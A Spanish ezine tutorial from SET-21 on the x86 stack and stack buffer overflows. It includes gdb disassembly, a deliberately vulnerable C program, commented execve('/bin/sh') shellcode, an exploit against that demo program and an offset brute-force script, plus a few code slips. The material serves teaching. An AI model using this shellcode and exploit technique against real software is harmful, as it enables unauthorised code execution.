@@ -1,0 +1,595 @@
+-[ 0x08 ]--------------------------------------------------------------------
+-[ ASM y Buffer Overflows ]--------------------------------------------------
+-[ by Doing ]---------------------------------------------------------SET-21-
+
+
+                           Asm y buffer overflows
+                          ------------------------     
+                                 By Doing
+	                  ------------------------ 
+                            <jdoing@hotmail.com> 
+			  
+
+ Bueno, por fin me he decidido a escribir un articulo para SET, espero que 
+ lo encontreis interesante. Seguro que muchos de los hackers newbies que
+ ahora estan descubriendo el mundo del hacking habran oido hablar de los
+ tan famosos exploits, pero todavia no saben que hacen, ni como funcionan;
+ pues para eso escribo este co~azo.
+
+ Para entender esto te ayudara saber algo de C o ensamblador pero no es 
+ indispensable. Voy a empezar explicando que #"@% es eso del stack.
+
+
+			  ==> El stack (o pila) <==
+
+
+ El stack es una region de memoria que las funciones usan para guardar sus
+ variables locales y para guadar temporalmente el contenido de los registros
+ del procesador (por ejemplo, cuando se llama a una funcion, los parametros
+ se pasan por el stack). El segmento de stack se guarda en un registro del
+ procesador, el SS. Tambien existe un registro que apunta al lugar en donde
+ se encuentra la "pila". La pila se usa para guardar temporalmente el
+ contenido de los registros (eso ya lo he dicho antes). Para guardar el
+ contenido de un registro en la pila se usa la instruccion push, y para 
+ recuperar el ultimo dato almacenado en la pila su usa la instruccion pop.
+
+ Vamos a poner un ejemplo:
+
+ Esto es un segmento de stack:
+
+         0x00                                                  0xFFFFFFFF
+ SS ==> [0000000000000000000000000[VAR1][VAR2][SBP][RET][ARGV1][ARGV2]...]
+                                 ^
+                            STACK POINTER
+
+ Como veis, nada mas llamar a una funcion, el ESP se encuentra justo detras 
+ de la ultima variable declarada. Cuando usamos push, guardamos el dato desde
+ la posicion del ESP hacia ATRAS, y el ESP de decrementa en tantos bytes como
+ tenga nuestro dato.
+
+ Vamos a suponer que guardamos en la pila el reg EAX (4 BYTES)
+
+ pushl %eax (La "l" despues de push quiere decir que el operando ocupa 32 bits)
+
+ El segmento de antes quedaria asi:
+
+       0x00                                                    0xFFFFFFFF
+SS ==> [000000000000000000000[EAX][VAR2][VAR1][SBP][RET][ARGV1][ARGV2]...]
+                            ^
+                       STACK POINTER
+
+ Ahora vamos a recuperarlo en otro registro:
+
+ popl %ebx
+
+ En este momento el ESP se incrementa en tantos bytes como tenga nuestro dato,
+ asi que se queda como al principio, usease, como antes de hacer el ultimo
+ push. Con esto se puede deducir una cosa: los datos que vas sacando de la
+ pila salen en orden inverso al que fueron introducidos. En jerga "tesnica"
+ se dice que la pila es una estructura LIFO (Last In, First Out).
+
+ Acabais de ver como el procesador accede a la pila, creo haber dicho que el
+ stack tambien se usa para acceder a las variables locales, pero, comorr?.
+
+ Para acceder a memoria necesitamos dos cosas: segmento y despazamiento. Bien,
+ el segmento ya lo tenemos, el SS, y el offset (NOTA: offset = desplazamiento)
+ se guarda (seguro que ya lo habeis adivinado ;) en otro registro, el EBP.
+ El EBP apunta al comienzo de la primera variable declarada.
+
+ Volvamos otra vez al segmento de antes:
+
+         0x00                                                   0xFFFFFFFF
+SS ==>  [0000000000000000000000000[VAR2][VAR1][SBP][RET][ARGV1][ARGV2]...]
+                                 ^           ^
+                                ESP         EBP
+
+ Vamos a poner otro ejemplo:
+
+ void ejemplo(char *argumento){
+     char buff[4];
+ }
+ void main()
+ {
+     char *VAR_MAIN;
+     ejemplo(VAR_MAIN);
+ }
+ 
+ Compilemos el codigo:
+ 
+ $ gcc ejem.c -o ejem
+ 
+ Ahora vamos a desensamblarlo para entender como llama a la funcion ejemplo y
+ que hace con los registros:
+
+ $ gdb ejem
+ 
+ (gdb) disassemble main
+ Dump of assembler code for function main:
+ 0x8048458 <main>:       pushl  %ebp
+ 0x8048459 <main+1>:     movl   %esp,%ebp
+ 0x804845b <main+3>:     subl   $0x4,%esp
+ 0x804845e <main+6>:     movl   0xfffffffc(%ebp),%eax
+ 0x8048461 <main+9>:     pushl  %eax
+ 0x8048462 <main+10>:    call   0x8048440 <ejemplo>
+ 0x8048467 <main+15>:    addl   $0x4,%esp
+ 0x804846a <main+18>:    leave  
+ 0x804846b <main+19>:    ret    
+ End of assembler dump.
+ 
+ OK. En <main> guardamos el registro ebp en la pila, esto lo hacen todas las
+ funciones cuando son llamadas. Hemos dicho que ebp apunta a al comienzo de
+ las variables locales de una funcion, pero cuando se llama a otra funcion,
+ esta tambien tiene que almacenar en ebp la direccion de sus variables, asi
+ que se guarda en la pila para luego restaurarlo. En nuestro segmento esta
+ en [SBP].
+
+ En <main+1> copiamos en ebp el contenido de esp. Asi que tenemos que ebp
+ y esp apuntan justo detras de [SBP]. Otro dibujito: 
+
+        0x00                                                    0xFFFFFFFF
+SS ==> [0000000000000000000000000000000000000[SBP][RET][ARGV1][ARGV2]...]
+                                             ^
+                                            EBP
+                                            ESP
+
+ Si ahora hicieramos un push de lo que sea, en este momento escribiriamos
+ en la seccion de memoria donde queremos guardar VAR_MAIN, asi que en
+ <main+3> restamos el tama~o de VAR_MAIN a esp, quedando el famosisimo
+ segmento asi:
+
+         0x00                                                    0xFFFFFFFF
+SS ==>  [000000000000000000000000000[VAR_MAIN][SBP][RET][ARGV1][ARGV2]...]
+                                   ^          ^
+                                  ESP        EBP
+
+ (NOTA: Si os fijais se restan 4 bytes a esp, ya que VAR_MAIN es un puntero)
+
+ Asi que ya tenemos los dos punteros del stack apuntando donde deben. Estos
+ tres pasos: (pushl %ebp ; movl %esp,%ebp ; subl tamaño_variables,%esp)
+ tienen que hacerlos todas las funciones. Ahora vamos con el proceso de
+ llamada:
+
+ 0x804845e <main+6>:     movl   0xfffffffc(%ebp),%eax
+ 0x8048461 <main+9>:     pushl  %eax
+ 0x8048462 <main+10>:    call   0x8048440 <ejemplo>
+ 0x8048467 <main+15>:    addl   $0x4,%esp
+ 
+ Como ya sabeis para pasar los parametros a una funcion se usa la pila,
+ pero como no se puede hacer push de una direccion de memoria se usa el
+ reg. eax. En <main+6> movemos 4 bytes de la direccion de memoria
+ (%ebp + 0xfffffffc), pero como 0xfffffffc = (-4), lo que estamos
+ haciendo es copiar 4 bytes desde ebp-4, VAR_MAIN, a eax. Despues en
+ <main+9> lo ponemos en la pila y justo antes de hacer la llamada a
+ <ejemplo> nuestro queridisimo segmento esta asi:
+
+        0x00                                                    0xFFFFFFFF
+SS ==>  [0000000000000000000[PARAM1][VAR_MAIN][SBP][RET][ARGV1][ARGV2]...]
+                           ^                  ^
+                          ESP                EBP
+
+ Aqui esp apunta 4 bytes mas abajo, ahora tenemos que llamar a <ejemplo>.
+ Pero antes una pregunta: si a <ejemplo> se le llama desde <main+10>, donde
+ guarda el programa la direccion de la siguiente instruccion a ejecutar, o
+ lo que es lo mismo, la direccion de RETORNO? Seguro que ya lo habeis
+ adivininado, pues claro hombre, en la pila. Esta direccion de retorno que
+ a partir de ahora llamare RET, es lo que vamos a modificar a la hora de
+ "xplotar" un programa que tenga un bug. Pues bien, cuando <main+10> se
+ ejecuta pone en la pila la direccion de retorno, en este caso es la
+ direccion de <main+15>. 
+
+ Ahora vamos a desemsamblar <ejemplo>
+
+ (gdb) disassemble ejemplo
+ Dump of assembler code for function ejemplo:
+ 0x8048440 <ejemplo>:    pushl  %ebp
+ 0x8048441 <ejemplo+1>:  movl   %esp,%ebp
+ 0x8048443 <ejemplo+3>:  subl   $0x4,%esp
+ 0x8048446 <ejemplo+6>:  leave  
+ 0x8048447 <ejemplo+7>:  ret    
+ End of assembler dump.
+ 
+ Vamos a suponer que ya se han ejecutado las tres primeras inst. de ejemplo.
+ El segmento de stack estaria asi:
+
+       0x00                                                        0xFFFFFFFF
+SS ==> [0000000[BUFF][SBP][RET][PARAM1][VAR_MAIN][SBP][RET][ARGV1][ARGV2]...]
+              ^      ^      ^     
+             ESP    EBP    RET apunta a <main+15>
+
+ Las inst. leave y ret se encargan de dejar el ebp como estaba, es decir,
+ para que apunte a las variables locales de funcion que la llamo (main),
+ asi que restaura de la pila el [SBP], que lo quardo en <ejemplo>. Despues
+ saca a [RET] de la pila y salta a la direccion a la que apunta : <main+15>.
+ Y antes de que se ejecute esta instruccion, el dichoso segmento:
+ 
+        0x00                                                        0xFFFFFFFF
+SS ==> [00000000000000000000000[PARAM1][VAR_MAIN][SBP][RET][ARGV1][ARGV2]...]
+                              ^                 ^           
+                             ESP               EBP    
+
+ El segmento se ha quedado justo igual que antes de hacer la llamada a ejemplo,
+ tanto es asi que todavia esta en la pila el parametro que le pasamos. Asi que
+ en <main+15>:
+
+          addl   $0x4,%esp
+  
+ se le suman al esp el tamaño de los argumentos que le pasamos a <ejemplo>.
+ Con lo que el segmento de stack se exactamente igual que en <main+6>.
+ 	
+ Bien, pues ahora que ya conoceis todo esto ya podemos ir entrando en materia
+ (Ya era hora no??).
+
+                               ==> BUFFER OVERFLOWS <==
+
+ 
+ El objetivo de los xploits es modificar el flujo de ejecucion de un programa
+ para que ejecute algo que nosotros queremos, generalmente una shell. Para
+ conseguir esto hay que aprovechar errores de programacion. Por ejemplo,
+ vamos a modificar la funcion de ejemplo de antes para hacerla vulnerable.
+ Esta es el nuevo programa:
+
+  void vulnerable()
+  {
+      char buffer_pequeno[100];
+      char buffer_grande[200];
+  
+      memset(buffer_grande,1,200);    
+      strcpy(buffer_pequenco,buffer_grande);
+  }
+  void main()
+  {
+      vulnerable();
+  }
+  
+ Lo que que hace la funcion vulnerable es copiar en un buffer de 100 bytes
+ otro que ocupa el doble, con lo que se sobreesciben los datos que hay a
+ continuacion de buffer_pequeno. Y, cuales son los datos que se
+ sobreescriben?. Pues los que estan a continuacion de buffer_pequeno en el
+ segmento de stack : [SFP] y [RET]. Si se escribe encima de [RET] cuando
+ termine la funcion saltara a la direccion que este apuntando, en este caso
+ 0x01010101, y como ahi no puede leer se producira una violacion de segmento.
+
+	
+	Vamos a comprobarlo:
+
+ $ gcc ejem2.c -o ejem2
+ $ ./ejem2
+ Segmentation fault (core dumped)
+ $ 
+
+ Vamos a hacer una pequeña modificacion a ejem2 para que pueda ser explotado.
+
+  void vulnerable(char *ptr)
+  {
+      char buffer_pequeno[512];    
+      strcpy(buffer_pequeno,ptr);
+  }
+  
+  void main(int argc,char **argv)
+  {
+      vulnerable(argv[1]);
+  }
+  
+  Ahora para sobreescribir la direccion RET tenemos que pasarle un argumento
+  de 520 bytes como minimo (recordad [SFP] y [RET] ocupan 4 bytes cada una).
+
+  Bien, antes dije que lo mas comun a la hora de hacer xploits era que nos
+  dieran una shell. Asi que lo que tenemos que hacer es sobreescribir [RET]
+  con una direccion donde tengamos un codigo que ejecute una shell. Pero,
+  donde podemos guardar nuestro codigo para que este en el espacio de
+  direcciones de ejem2?.
+  Vamos a pasarselo a ejem2 como argumento. Otro problema que tenemos es que
+  no sabemos cual va a ser la direccion exacta de nuestro codigo en el stack,
+  pero sabemos que los ESP tienen valores muy parecidos en programas que se
+  ejecutan en el mismo ordenador, o en distintos ordenadores con el mismo
+  sistema operativo. Asi que vamos a "adivinar" la direccion de retorno.
+  Vamos a probar a restarle offsets distintos al ESP de nuestro exploit,
+  hasta que funcione. Asi que el argumento que tenemos que pasar a ejem2
+  es mas o menos como el siguiente:
+
+0                                                                               600
+[Codigo_Codigo_Codigo_Codigo_Codigo_Codigo_RET_RET_RET_RET_RET_RET_RET_RET_RET_RET]
+
+  Ahora toca ensamblador. Para programar nuestro codigo vamos a usar asm.
+  Queremos que ejecute una shell, por ejemlo "/bin/sh". En C la instruccion
+  que nos interesa es execve(char *,char **,char **). Los argumentos son:
+
+	- Puntero al path completo del programa.
+	- Puntero a una lista con los argumentos (**argv).
+	- Lista de las variables de entorno. 
+
+	Vamos a destripar la funcion execve().
+
+  ejem3.c
+
+  #include <stdlib.h>
+  void main()
+  {
+          char *arg[2];
+          arg[0] = "/bin/sh";
+          arg[1] = NULL;
+  
+          execve(arg[0],arg,NULL);
+  }
+    
+  Este programa ejecuta una shell. Vamos a compilarlo y a desemsamblar
+  execve.
+
+  $ gcc ejem3.c -o ejem3 -g -static
+  $ gdb ejem3
+  
+  (gdb) disassemble execve
+  Dump of assembler code for function execve:
+  0x804ca10 <execve>:     pushl  %ebx
+  0x804ca11 <execve+1>:   movl   0x10(%esp,1),%edx
+  0x804ca15 <execve+5>:   movl   0xc(%esp,1),%ecx
+  0x804ca19 <execve+9>:   movl   0x8(%esp,1),%ebx
+  0x804ca1d <execve+13>:  movl   $0xb,%eax
+  0x804ca22 <execve+18>:  int    $0x80
+  0x804ca24 <execve+20>:  popl   %ebx
+  0x804ca25 <execve+21>:  cmpl   $0xfffff001,%eax
+  0x804ca2a <execve+26>:  jae    0x804cc30 <__syscall_error>
+  
+  Hace lo siguiente:
+
+	- Pone en edx la direccion de las variables de entorno (Para nuestro
+          caso es NULL)
+
+	- Pone en ecx la direccion de la lista de argumentos (Como nuestra
+          llamada solo va tener un argumento en ecx vamos a poner la
+          direccion de la direccion de "/bin/sh")
+
+	- Pone en ebx la direccion del primer argumento.
+
+	- Pone en eax 11 (0xb) y llama a la funcion 0x80 (llamada a al
+          sistema)
+
+  Y nosotros en nuestro codigo vamos a hacer esto:
+
+	- Tener en memoria ls cadena "/bin/sh".
+
+	- Tener tambien en memoria la direccion de "/bin/sh" seguida
+          de un long nulo.
+
+	- Poner en eax 11 (0xb).
+
+	- Poner en ebx la direccion de "/bin/sh".
+
+	- Poner en ecx la direccion de la direccion de "/bin/sh".
+
+	- Poner en edx la direccion del long nulo que esta despues de
+          la dir. de "/bin/sh".
+
+        - Llamar a la interrupcion 0x80.
+
+  Y por si la llamada a execve falla. A continuacion vamos a hacer una
+  llamada a exit() :
+
+		- Poner 0 en %ebx (exit code)
+		- Poner 1 en %eax
+		- int 0x80.
+
+  Pero aqui nos encontramos con otro problema, nuestro codigo va a ser
+  una string, y no sabemos donde va a estar la string "/bin/sh", pero
+  para eso vamos a hacer uso de jmp y call. 
+
+  Nuestro codigo quedaria asi:
+
+       jmp 0x1f                 # Saltamos al CALL que hay antes de /bin/sh
+       popl %edi                # En la pila esta la direccion de /bin/sh
+                                # asi que la ponemos en edi
+
+       movl %edi,%ebx           # Ponemos en ebx la dir. de /bin/sh
+
+       xorl %eax,%eax           # Ponemos 0 en eax
+       movb %al,0x7(%edi)       # Ponemos un 0 justo delante de /bin/sh
+                                # ya que tiene que ser una str terminada
+                                # en 0 (NULL terminated).
+
+       movl %edi,0x8(%edi)      # Ponemos en memoria la dir. /bin/sh
+       movl %eax,0xc(%edi)      # seguida de un long nulo
+
+       leal 0x8(%edi),%ecx      # Ponemos en ecx la dir. de la dir. de /bin/sh
+       leal 0xc(%edi),%edx      # Ponemos en edx la dir. del long nulo.
+
+       movb $0xb,%eax           # Ponemos 11 en eax 
+
+       int $0x80                # llamada al sistema
+     
+       xorl %ebx,%ebx           # Por si falla execve vamos a llamar a exit()
+       movl %ebx,%eax           # Ponemos 0 en ebx (exit code)
+       inc %eax                 # y 1 en eax (exit())
+     
+       int $0x80                 # llamada al sistema
+
+       call -0x24               # Esta llamda se ocupa de poner en la pila
+                                # la direccion de /bin/sh, que era uno
+                                # de los problemas que teniamos
+
+       .ascii \"/bin/sh0\"       # Esto no hace falta que lo explique 
+       .byte 0x00
+
+
+	Esto es un programa que prueba la shellcode:
+
+ejem4.c
+
+void shellc(){
+	__asm__("
+
+       jmp 0x1f                
+       popl %edi                
+       movl %edi,%ebx         
+       xorl %eax,%eax          
+       movb %al,0x7(%edi)       
+       movl %edi,0x8(%edi)      
+       movl %eax,0xc(%edi)      
+       leal 0x8(%edi),%ecx      
+       leal 0xc(%edi),%edx     
+       movb $0xb,%eax         
+       int $0x80               
+       xorl %ebx,%ebx         
+       movl %ebx,%eax           
+       inc %eax                 
+       int $0x80                 
+       call -0x24             
+       .ascii \"/bin/sh0\"      
+       .byte 0x00
+             ");
+}
+
+void main()
+{	
+	int *RET;
+	char dst[200];
+	
+strcpy(dst,(char*)shellc);  /*  copiamos la shellcode del segmento
+                               de codigo al segmento de datos. Esto se
+                               hace porque nuestro codigo escribe
+                               un cero al final de /bin/sh, pero si
+                               la shellcode se encuentra en el segmento
+                               de codigo nos dara una violacion de
+                               segmento porque linux marca las paginas
+                               de codigo como de solo-lectura */
+
+   RET = (int*) &RET + 2; /*   Hacemos que RET apunte a la direccion
+                               de retorno */
+	
+   (*RET) = (int) dst;    /*   Y escribimos la direccion de nuestro codigo
+                               en la direccion de retorno. Asi cuando termine
+                               nuestro programa, se ejcutara la shellcode y
+                               veremos si funciona o no */
+}
+	
+
+	Lo compilamos y lo ejecutamos:
+
+ $ gcc ejem4.c -o ejem4
+ $ ./ejem4
+ bash$ 
+
+ Parece que funciona. Si os fijais, en las inst. de la shellcode no hay
+ ningun 0. Si lo hubiera, al hacer la copia de nuestro codigo a otro parte,
+ se pararia al encontar un byte nulo.
+
+      Volvamos con el xploit. Ya tenemos el codigo, y la direccion de
+      retorno hemos quedado que iba a ser el ESP de nuestrp xploit.
+      Ya podemos escribir el xploit:
+
+xploit1.c
+
+#include <stdlib.h>
+
+void shellc(){
+	__asm__("
+
+       jmp 0x1f                
+       popl %edi                
+       movl %edi,%ebx         
+       xorl %eax,%eax          
+       movb %al,0x7(%edi)       
+       movl %edi,0x8(%edi)      
+       movl %eax,0xc(%edi)      
+       leal 0x8(%edi),%ecx      
+       leal 0xc(%edi),%edx     
+       movb $0xb,%eax         
+       int $0x80               
+       xorl %ebx,%ebx         
+       movl %ebx,%eax           
+       inc %eax                 
+       int $0x80                 
+       call -0x24             
+       .ascii \"/bin/sh0\"      
+       .byte 0x00
+             ");
+}
+
+long get_esp(){
+  __asm__("
+   movl %esp,%eax
+");
+}
+
+void main(int argc,char **argv)
+{	
+  int tam = 600;  /* Vamos a pasarle a ejem2 un arg de 600 bytes */
+  char *crack = (char*) malloc(tam);
+  char dst[200];
+  long addr;
+  long off = 0;
+  char *arg[3];
+  int i;
+
+  printf(" ejem2 Xploit - by Doing\n");
+  printf(" Uso:\n");
+  printf("\t%s [offset]\n",argv[0]);
+
+  if (argc > 1) off = atoi(argv[1]);
+  
+  addr = get_esp() - off; /* Calculamos la direccion de retorno:
+			     esp - offset_aleatorio (entre -500 y 500)
+			   */
+
+  strcpy(dst,(char*)shellc); 	/* copiamos la shellcode a dst */
+
+  for (i = 0; i < tam; i+=4){
+    /* este bucle llena la cadena crack con la direccion de retorno */
+
+    crack[i] = (addr & 0x000000FF);
+    crack[i + 1] = (addr & 0x0000FF00) >> 8;
+    crack[i + 2] = (addr & 0x00FF0000) >> 16;
+    crack[i + 3] = (addr & 0xFF000000) >> 24;
+  }
+
+  strncpy(crack,dst,strlen(dst)); /* Y copiamos dst al principio de crack */
+
+  /*  Ahora vamos a intentar xplotar ejem2 */
+
+  arg[0] = "./ejem2";
+  arg[1] = crack;
+  arg[2] = NULL;
+
+  execve(arg[0],arg,NULL);
+}
+
+
+	Lo compilamos y vamos a intentar xplotar ejem2:
+
+$ ./xploit1
+ ejem2 Xploit - by Doing
+ Uso:
+	./xploit1 [offset]
+Illegal Instruction (core dumped)
+
+Tendremos que modificar el valor de offset. Lo mejor es usar un script.
+Aqui teneis uno:
+
+busca_offset
+
+#!/bin/bash
+par=-500
+
+while [ $par -le 500 ];do
+echo "$par"
+./xploit1 $par 
+par=$((par+1)) 
+done
+
+	Le dais permisos de ejecucion y lo ejecutais:
+
+$ ./busca_offset
+
+-500
+ ejem2 Xploit - by Doing
+ Uso:
+	./xploit1 [offset]
+Illegal Instruction (core dumped)
+-499
+ ejem2 Xploit - by Doing
+ Uso:
+	./xploit1 [offset]
+Illegal Instruction (core dumped)
+
+
+*EOF*
+
